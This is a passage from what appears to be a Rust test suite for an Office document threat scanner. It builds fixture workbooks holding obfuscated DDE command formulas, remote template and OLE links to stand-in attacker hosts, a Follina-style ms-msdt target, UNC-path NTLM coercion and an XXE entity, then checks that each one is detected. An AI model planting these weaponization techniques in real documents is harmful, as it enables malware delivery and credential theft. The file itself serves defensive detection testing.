        <si><t>d</t></si>\
        <si><t>dropper</t></si>\
        <si><t>http://attacker.example.com/beacon.exe</t></si>\
    </sst>";

    let content_types_ss = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/><Default Extension=\"xml\" ContentType=\"application/xml\"/><Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.ms-excel.sheet.macroEnabled.main+xml\"/><Override PartName=\"/xl/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/><Override PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/><Override PartName=\"/xl/sharedStrings.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml\"/></Types>";
    let wb_rels_ss = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/><Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/><Relationship Id=\"rId3\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings\" Target=\"sharedStrings.xml\"/></Relationships>";

    let xlsm = synthesize_zip(&[
        ("[Content_Types].xml", content_types_ss.as_bytes()),
        ("_rels/.rels", pkg_rels.as_bytes()),
        ("xl/workbook.xml", wb.as_bytes()),
        ("xl/_rels/workbook.xml.rels", wb_rels_ss.as_bytes()),
        ("xl/vbaProject.bin", &cfb),
        ("xl/worksheets/sheet1.xml", sheet1.as_bytes()),
        ("xl/sharedStrings.xml", shared_strings.as_bytes()),
    ]);

    let options = AnalysisOptions::default();
    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
    let threats = &inspection.extracted.cell_threats;

    // Check D1: De-obfuscated DDE resolved via TEXTJOIN, INDEX, UNICHAR, HEX2DEC
    assert!(
        threats.iter().any(|t| t.cell_ref == "D1"
            && t.threat_kind == "DDE"
            && t.description.contains("cmd.exe|'/c calc'!A0")),
        "D1 should resolve to cmd.exe DDE: {threats:?}"
    );

    // Check E1: De-obfuscated payload URL resolved via VLOOKUP
    assert!(
        threats.iter().any(|t| t.cell_ref == "E1"
            && t.threat_kind == "DeobfuscatedThreat"
            && t.description
                .contains("http://attacker.example.com/beacon.exe")),
        "E1 should resolve to payload URL: {threats:?}"
    );
}

#[test]
fn e2e_ooxml_container_package_threat_inspection() {
    let src = "Sub Safe()\nEnd Sub\n";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);
    let cfb = synthesize_cfb_project("PkgThreatProj", &[("ThisWorkbook", src, &pcode)], &["Safe"]);

    let content_types = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/><Default Extension=\"xml\" ContentType=\"application/xml\"/><Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.ms-excel.sheet.macroEnabled.main+xml\"/><Override PartName=\"/xl/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/><Override PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/></Types>";
    let pkg_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/></Relationships>";
    let wb = "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId2\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"/></sheets></workbook>";
    let wb_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
        <Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/>\
        <Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/>\
        <Relationship Id=\"rId3\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"https://c2.example.com/templates/weaponized.dotm\" TargetMode=\"External\"/>\
        <Relationship Id=\"rId4\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\" Target=\"http://attacker.example.com/exploit.hta\" TargetMode=\"External\"/>\
        <Relationship Id=\"rId5\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/subDocument\" Target=\"http://attacker.example.com/subdoc.docx\" TargetMode=\"External\"/>\
    </Relationships>";
    let sheet1 = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData><row r=\"1\"><c r=\"A1\"><v>100</v></c></row></sheetData></worksheet>";
    let ole_payload = b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1DummyEquationPayload";
    let activex_payload = b"ActiveXBinaryBlobData";

    let xlsm = synthesize_zip(&[
        ("[Content_Types].xml", content_types.as_bytes()),
        ("_rels/.rels", pkg_rels.as_bytes()),
        ("xl/workbook.xml", wb.as_bytes()),
        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
        ("xl/vbaProject.bin", &cfb),
        ("xl/worksheets/sheet1.xml", sheet1.as_bytes()),
        ("xl/embeddings/oleObject1.bin", ole_payload),
        ("xl/activeX/activeX1.bin", activex_payload),
    ]);

    let options = AnalysisOptions::default();
    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
    let threats = &inspection.extracted.cell_threats;

    // Verify VBA-CELL-010: Remote Template Injection
    assert!(
        threats
            .iter()
            .any(|t| t.threat_kind == "RemoteTemplateInjection"
                && t.severity == "Critical"
                && t.formula
                    .contains("https://c2.example.com/templates/weaponized.dotm")),
        "Should detect RemoteTemplateInjection (VBA-CELL-010): {threats:?}"
    );

    // Verify VBA-CELL-011: Embedded OLE Package
    assert!(
        threats.iter().any(|t| t.threat_kind == "EmbeddedOlePackage"
            && t.severity == "High"
            && t.coordinate == "part:xl/embeddings/oleObject1.bin"),
        "Should detect EmbeddedOlePackage (VBA-CELL-011): {threats:?}"
    );

    // Verify VBA-CELL-012: External OLE Object Link
    assert!(
        threats.iter().any(|t| t.threat_kind == "ExternalOleObject"
            && t.severity == "High"
            && t.formula
                .contains("http://attacker.example.com/exploit.hta")),
        "Should detect ExternalOleObject (VBA-CELL-012): {threats:?}"
    );

    // Verify VBA-CELL-013: Embedded ActiveX Control
    assert!(
        threats.iter().any(|t| t.threat_kind == "ActiveXControl"
            && t.severity == "Medium"
            && t.coordinate == "part:xl/activeX/activeX1.bin"),
        "Should detect ActiveXControl (VBA-CELL-013): {threats:?}"
    );

    // Verify VBA-CELL-014: External Subdocument Reference
    assert!(
        threats
            .iter()
            .any(|t| t.threat_kind == "ExternalSubdocument"
                && t.severity == "High"
                && t.formula
                    .contains("http://attacker.example.com/subdoc.docx")),
        "Should detect ExternalSubdocument (VBA-CELL-014): {threats:?}"
    );

    // Verify SARIF export contains all 5 rules (VBA-CELL-010 through 014)
    let sarif = inspection_to_sarif(&inspection, "threats.xlsm");
    assert!(
        sarif.contains("\"ruleId\":\"VBA-CELL-010\""),
        "SARIF missing VBA-CELL-010"
    );
    assert!(
        sarif.contains("\"ruleId\":\"VBA-CELL-011\""),
        "SARIF missing VBA-CELL-011"
    );
    assert!(
        sarif.contains("\"ruleId\":\"VBA-CELL-012\""),
        "SARIF missing VBA-CELL-012"
    );
    assert!(
        sarif.contains("\"ruleId\":\"VBA-CELL-013\""),
        "SARIF missing VBA-CELL-013"
    );
    assert!(
        sarif.contains("\"ruleId\":\"VBA-CELL-014\""),
        "SARIF missing VBA-CELL-014"
    );
    assert!(
        sarif.contains("\"kind\":\"relationship\""),
        "SARIF missing relationship logical location"
    );
    assert!(
        sarif.contains("\"kind\":\"part\""),
        "SARIF missing part logical location"
    );

    // Verify JSON export contains rule_ids
    let json = inspect_to_json(&inspection, Disclosure::StructureOnly);
    assert!(
        json.contains("\"rule_id\":\"VBA-CELL-010\""),
        "JSON missing VBA-CELL-010"
    );
    assert!(
        json.contains("\"rule_id\":\"VBA-CELL-011\""),
        "JSON missing VBA-CELL-011"
    );
    assert!(
        json.contains("\"rule_id\":\"VBA-CELL-012\""),
        "JSON missing VBA-CELL-012"
    );
    assert!(
        json.contains("\"rule_id\":\"VBA-CELL-013\""),
        "JSON missing VBA-CELL-013"
    );
    assert!(
        json.contains("\"rule_id\":\"VBA-CELL-014\""),
        "JSON missing VBA-CELL-014"
    );

    // Now test weaponized macro-less DOCX container (no vbaProject.bin inside!)
    let docx_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
        <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"https://remote.c2.server/payload.dotm\" TargetMode=\"External\"/>\
    </Relationships>";
    let docx = synthesize_zip(&[
        ("word/_rels/settings.xml.rels", docx_rels.as_bytes()),
        ("word/embeddings/exploit.bin", b"EmbeddedPackagerPayload"),
    ]);

    let extracted_docx = extract_macro_container(&docx, &Limits::default())
        .expect("extract_macro_container on weaponized macro-less DOCX should succeed");
    assert_eq!(extracted_docx.modules.len(), 0);
    assert_eq!(extracted_docx.cell_threats.len(), 2);
    assert!(
        extracted_docx
            .cell_threats
            .iter()
            .any(|t| t.threat_kind == "RemoteTemplateInjection"),
        "DOCX should detect RemoteTemplateInjection"
    );
    assert!(
        extracted_docx
            .cell_threats
            .iter()
            .any(|t| t.threat_kind == "EmbeddedOlePackage"),
        "DOCX should detect EmbeddedOlePackage"
    );
}

#[test]
fn e2e_indirect_offset_address_and_concat_cell_threat_deobfuscation() {
    let src = "Sub CleanProc()\nEnd Sub\n";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);
    let cfb = synthesize_cfb_project(
        "DynamicChainedProj",
        &[("ThisWorkbook", src, &pcode)],
        &["CleanProc"],
    );

    let content_types = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/><Default Extension=\"xml\" ContentType=\"application/xml\"/><Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.ms-excel.sheet.macroEnabled.main+xml\"/><Override PartName=\"/xl/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/><Override PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/><Override PartName=\"/xl/worksheets/sheet2.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/></Types>";
    let pkg_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/></Relationships>";
    let wb = "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId2\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"/><sheet name=\"Sheet2\" sheetId=\"2\" r:id=\"rId3\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"/></sheets></workbook>";
    let wb_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
        <Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/>\
        <Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/>\
        <Relationship Id=\"rId3\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet2.xml\"/>\
    </Relationships>";

    // Sheet1:
    // A1: "cmd", B1: ".exe", C1: "|'/c calc'!A0"
    // D1: =INDIRECT(ADDRESS(1, 1)) & INDIRECT(ADDRESS(1, 2)) & INDIRECT(ADDRESS(1, 3))
    // E1: =CONCAT(OFFSET(A1, 0, 0, 1, 3))
    // F1: =HYPERLINK(INDIRECT("Sheet2!A1"), "ClickHere")
    let sheet1 = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData>\
        <row r=\"1\">\
            <c r=\"A1\" t=\"inlineStr\"><is><t>cmd</t></is></c>\
            <c r=\"B1\" t=\"inlineStr\"><is><t>.exe</t></is></c>\
            <c r=\"C1\" t=\"inlineStr\"><is><t>|'/c calc'!A0</t></is></c>\
            <c r=\"D1\"><f>=INDIRECT(ADDRESS(1, 1)) &amp; INDIRECT(ADDRESS(1, 2)) &amp; INDIRECT(ADDRESS(1, 3))</f></c>\
            <c r=\"E1\"><f>=CONCAT(OFFSET(A1, 0, 0, 1, 3))</f></c>\
            <c r=\"F1\"><f>=HYPERLINK(INDIRECT(&quot;Sheet2!A1&quot;), &quot;ClickHere&quot;)</f></c>\
        </row>\
    </sheetData></worksheet>";

    // Sheet2:
    // A1: "http://attacker.example.com/trojan.exe"
    let sheet2 = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData>\
        <row r=\"1\">\
            <c r=\"A1\" t=\"inlineStr\"><is><t>http://attacker.example.com/trojan.exe</t></is></c>\
        </row>\
    </sheetData></worksheet>";

    let xlsm = synthesize_zip(&[
        ("[Content_Types].xml", content_types.as_bytes()),
        ("_rels/.rels", pkg_rels.as_bytes()),
        ("xl/workbook.xml", wb.as_bytes()),
        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
        ("xl/vbaProject.bin", &cfb),
        ("xl/worksheets/sheet1.xml", sheet1.as_bytes()),
        ("xl/worksheets/sheet2.xml", sheet2.as_bytes()),
    ]);

    let options = AnalysisOptions::default();
    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
    let threats = &inspection.extracted.cell_threats;

    // Check D1: De-obfuscated DDE resolved via INDIRECT(ADDRESS(...))
    assert!(
        threats.iter().any(|t| t.cell_ref == "D1"
            && t.threat_kind == "DDE"
            && t.description.contains("cmd.exe|'/c calc'!A0")),
        "D1 should resolve to DDE via INDIRECT + ADDRESS: {threats:?}"
    );

    // Check E1: De-obfuscated DDE resolved via CONCAT(OFFSET(...))
    assert!(
        threats.iter().any(|t| t.cell_ref == "E1"
            && t.threat_kind == "DDE"
            && t.description.contains("cmd.exe|'/c calc'!A0")),
        "E1 should resolve to DDE via CONCAT + OFFSET: {threats:?}"
    );

    // Check F1: Suspicious Hyperlink resolved cross-sheet via INDIRECT("Sheet2!A1")
    assert!(
        threats.iter().any(|t| t.cell_ref == "F1"
            && t.threat_kind == "SuspiciousHyperlink"
            && t.description
                .contains("http://attacker.example.com/trojan.exe")),
        "F1 should resolve cross-sheet hyperlink via INDIRECT: {threats:?}"
    );
}

#[test]
fn e2e_bitwise_xlookup_and_text_threat_deobfuscation() {
    let src = "Sub CleanProc()\nEnd Sub\n";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);
    let cfb = synthesize_cfb_project(
        "BitwiseXlookupProj",
        &[("ThisWorkbook", src, &pcode)],
        &["CleanProc"],
    );

    let content_types = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/><Default Extension=\"xml\" ContentType=\"application/xml\"/><Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.ms-excel.sheet.macroEnabled.main+xml\"/><Override PartName=\"/xl/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/><Override PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/></Types>";
    let pkg_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/></Relationships>";
    let wb = "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId2\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"/></sheets></workbook>";
    let wb_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
        <Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/>\
        <Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/>\
    </Relationships>";

    let sheet1 = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData>\
        <row r=\"1\">\
            <c r=\"A1\" t=\"inlineStr\"><is><t>target_cmd</t></is></c>\
            <c r=\"B1\" t=\"inlineStr\"><is><t>cmd.exe</t></is></c>\
        </row>\
        <row r=\"2\">\
            <c r=\"A2\" t=\"inlineStr\"><is><t>target_arg</t></is></c>\
            <c r=\"B2\" t=\"inlineStr\"><is><t>|'/c powershell'</t></is></c>\
        </row>\
        <row r=\"3\">\
            <c r=\"A3\" t=\"inlineStr\"><is><t>target_url</t></is></c>\
            <c r=\"B3\" t=\"inlineStr\"><is><t>PREFIX:https://malware.example.com/trojan.exe:SUFFIX</t></is></c>\
        </row>\
        <row r=\"4\">\
            <c r=\"C1\"><f>=XLOOKUP(&quot;target_cmd&quot;, A1:A2, B1:B2) &amp; XLOOKUP(&quot;target_arg&quot;, A1:A2, B1:B2) &amp; &quot;!A0&quot;</f></c>\
            <c r=\"D1\"><f>=HYPERLINK(TEXTBEFORE(TEXTAFTER(XLOOKUP(&quot;target_url&quot;, A1:A3, B1:B3), &quot;PREFIX:&quot;), &quot;:SUFFIX&quot;), &quot;Click&quot;)</f></c>\
            <c r=\"E1\"><f>=CHAR(BITXOR(73, 42)) &amp; CHAR(BITXOR(71, 42)) &amp; CHAR(BITXOR(78, 42)) &amp; &quot;.exe|'/c calc'!A0&quot;</f></c>\
        </row>\
    </sheetData></worksheet>";

    let xlsm = synthesize_zip(&[
        ("[Content_Types].xml", content_types.as_bytes()),
        ("_rels/.rels", pkg_rels.as_bytes()),
        ("xl/workbook.xml", wb.as_bytes()),
        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
        ("xl/vbaProject.bin", &cfb),
        ("xl/worksheets/sheet1.xml", sheet1.as_bytes()),
    ]);

    let options = AnalysisOptions::default();
    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
    let threats = &inspection.extracted.cell_threats;

    // Verify C1: DDE resolved via XLOOKUP
    assert!(
        threats.iter().any(|t| t.cell_ref == "C1"
            && t.threat_kind == "DDE"
            && t.description.contains("cmd.exe|'/c powershell'!A0")),
        "C1 should resolve DDE via XLOOKUP: {threats:?}"
    );

    // Verify D1: Suspicious Hyperlink resolved via XLOOKUP + TEXTBEFORE + TEXTAFTER
    assert!(
        threats.iter().any(|t| t.cell_ref == "D1"
            && t.threat_kind == "SuspiciousHyperlink"
            && t.description
                .contains("https://malware.example.com/trojan.exe")),
        "D1 should resolve download URL via XLOOKUP + TEXTBEFORE + TEXTAFTER: {threats:?}"
    );

    // Verify E1: DDE resolved via BITXOR character decryption
    assert!(
        threats.iter().any(|t| t.cell_ref == "E1"
            && t.threat_kind == "DDE"
            && t.description.contains("cmd.exe|'/c calc'!A0")),
        "E1 should resolve DDE via BITXOR decryption: {threats:?}"
    );
}

#[test]
fn e2e_package_threats_printer_settings_custom_xml_and_protocols() {
    let src = "Sub CleanProc()\nEnd Sub\n";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);
    let cfb = synthesize_cfb_project(
        "PackageThreatProj",
        &[("ThisWorkbook", src, &pcode)],
        &["CleanProc"],
    );

    let content_types = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\
        <Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\
        <Default Extension=\"xml\" ContentType=\"application/xml\"/>\
        <Default Extension=\"bin\" ContentType=\"application/vnd.openxmlformats-officedocument.printer-settings\"/>\
        <Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.ms-excel.sheet.macroEnabled.main+xml\"/>\
        <Override PartName=\"/xl/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/>\
        <Override PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/>\
    </Types>";

    let pkg_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
        <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/>\
        <Relationship Id=\"rIdFollina\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\" Target=\"ms-msdt:/id PCWDiagnostic /skip force /param IT_LaunchMethod=ContextMenu\" TargetMode=\"External\"/>\
    </Relationships>";

    let wb = "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">\
        <sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId2\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"/></sheets>\
    </workbook>";

    let wb_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
        <Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/>\
        <Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/>\
        <Relationship Id=\"rIdPrint\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/printerSettings\" Target=\"printerSettings/printerSettings1.bin\"/>\
    </Relationships>";

    // Synthesize binary printer settings with UTF-16LE UNC path (DEVMODEW style)
    let unc_str = "\\\\10.0.0.1\\share\\evil_driver";
    let mut printer_bin = Vec::new();
    printer_bin.extend_from_slice(b"DEVMODEW_HEADER_DATA_PADDING");
    for u in unc_str.encode_utf16() {
        printer_bin.extend_from_slice(&u.to_le_bytes());
    }
    printer_bin.extend_from_slice(&[0u8, 0u8]); // null terminator

    // Synthesize customXml with base64 PE DOS stub and XXE injection
    let custom_xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
        <!DOCTYPE doc [ <!ENTITY xxe SYSTEM \"http://attacker.example.com/payload.dtd\"> ]>\
        <root>\
            <payload>TVqQAAMAAAAEAAAA//8AAL8AAAAAAAAEQAAAAAAAAA==</payload>\
        </root>";

    // Sheet with DECIMAL formula deobfuscating DDE
    let sheet1 = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData>\
        <row r=\"1\">\
            <c r=\"A1\"><f>=CHAR(DECIMAL(&quot;63&quot;, 16)) &amp; CHAR(DECIMAL(&quot;6D&quot;, 16)) &amp; CHAR(DECIMAL(&quot;64&quot;, 16)) &amp; &quot;.exe|'/c calc'!A0&quot;</f></c>\
        </row>\
    </sheetData></worksheet>";

    let xlsm = synthesize_zip(&[
        ("[Content_Types].xml", content_types.as_bytes()),
        ("_rels/.rels", pkg_rels.as_bytes()),
        ("xl/workbook.xml", wb.as_bytes()),
        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
        ("xl/vbaProject.bin", &cfb),
        ("xl/worksheets/sheet1.xml", sheet1.as_bytes()),
        ("xl/printerSettings/printerSettings1.bin", &printer_bin),
        ("customXml/item1.xml", custom_xml.as_bytes()),
    ]);

    let options = AnalysisOptions::default();
    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
    let threats = &inspection.extracted.cell_threats;

    // 1. Verify SuspiciousPrinterSettings (VBA-CELL-015)
    assert!(
        threats
            .iter()
            .any(|t| t.threat_kind == "SuspiciousPrinterSettings"
                && t.description.contains("UNC path")),
        "Should detect suspicious printer settings UNC injection: {threats:?}"
    );

    // 2. Verify CustomXmlPayloadSmuggling (VBA-CELL-016)
    assert!(
        threats
            .iter()
            .any(|t| t.threat_kind == "CustomXmlPayloadSmuggling"
                && (t.description.contains("PE Executable") || t.description.contains("XXE"))),
        "Should detect custom XML payload smuggling: {threats:?}"
    );

    // 3. Verify SuspiciousProtocolHandler or ExternalOleObject (VBA-CELL-017 / 012)
    assert!(
        threats.iter().any(|t| t.threat_kind == "ExternalOleObject"
            || t.threat_kind == "SuspiciousProtocolHandler"),
        "Should detect relationship target threat: {threats:?}"
    );

    // 4. Verify A1: DDE formula de-obfuscated via DECIMAL
    assert!(
        threats.iter().any(|t| t.cell_ref == "A1"
            && t.threat_kind == "DDE"
            && t.description.contains("cmd.exe|'/c calc'!A0")),
        "A1 should resolve DDE via DECIMAL hex decoding: {threats:?}"
    );

    // 5. Verify SARIF output contains VBA-CELL-015, VBA-CELL-016
    let sarif = inspection_to_sarif(&inspection, "file:///test/malicious.xlsm");
    assert!(
        sarif.contains("VBA-CELL-015"),
        "SARIF must contain VBA-CELL-015 rule"
    );
    assert!(
        sarif.contains("VBA-CELL-016"),
        "SARIF must contain VBA-CELL-016 rule"
    );
    assert!(
        sarif.contains("VBA-CELL-017"),
        "SARIF must contain VBA-CELL-017 rule"
    );
}

#[test]
fn e2e_drawing_actions_data_connections_and_filter_sort() {
    let src = "Attribute VB_Name = \"ThisWorkbook\"\nSub CleanProc()\nEnd Sub\n";
    let line0 = build_func_defn(0);
    let pcode = synthesize_pcode_line_map(&[&line0]);
    let cfb = synthesize_cfb_project(
        "DrawConnProj",
        &[("ThisWorkbook", src, &pcode)],
        &["CleanProc"],
    );

    // 1. Synthesize xl/drawings/vmlDrawing1.vml with form control linking to Auto_Open
    let vml_drawing = b"<xml><v:shape id=\"Button1\"><x:ClientData><x:FmlaMacro>Auto_Open</x:FmlaMacro></x:ClientData></v:shape></xml>";

    // 2. Synthesize xl/drawings/_rels/drawing1.xml.rels targeting executable payload
    let drawing_rels = b"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>
<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">
  <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink\" Target=\"http://attacker.com/stage2.exe\" TargetMode=\"External\"/>
</Relationships>";

    // 3. Synthesize xl/connections.xml with UNC path NTLM coercion
    let connections_xml = b"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>
<connections xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">
  <connection id=\"1\" name=\"EvilConn\" type=\"1\" connection=\"OLEDB;Provider=SQLOLEDB;Data Source=\\\\192.168.1.100\\share;Initial Catalog=evil;\"/>
</connections>";

    // 4. Sheet1 with dynamic array FILTER formula assembling DDE payload
    let sheet1_xml = b"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>
<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">
  <sheetData>
    <row r=\"1\">
      <c r=\"A1\" t=\"inlineStr\"><is><t>powershell.exe</t></is></c>
      <c r=\"B1\" t=\"n\"><v>1</v></c>
      <c r=\"C1\"><f>\"cmd.exe|'/c \" &amp; INDEX(FILTER(A1:A2, B1:B2), 1, 1) &amp; \"'!A0\"</f></c>
    </row>
    <row r=\"2\">
      <c r=\"A2\" t=\"inlineStr\"><is><t>notepad.exe</t></is></c>
      <c r=\"B2\" t=\"n\"><v>0</v></c>
    </row>
  </sheetData>
</worksheet>";

    let xlsm = synthesize_zip(&[
        (
            "[Content_Types].xml",
            b"<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"></Types>",
        ),
        (
            "_rels/.rels",
            b"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\
<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
  <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/>\
</Relationships>",
        ),
        (
            "xl/workbook.xml",
            b"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\
<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\">\
  <sheets>\
    <sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId1\"/>\
  </sheets>\
</workbook>",
        ),
        (
            "xl/_rels/workbook.xml.rels",
            b"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\
<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
  <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/>\
  <Relationship Id=\"rId2\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/>\
</Relationships>",
        ),
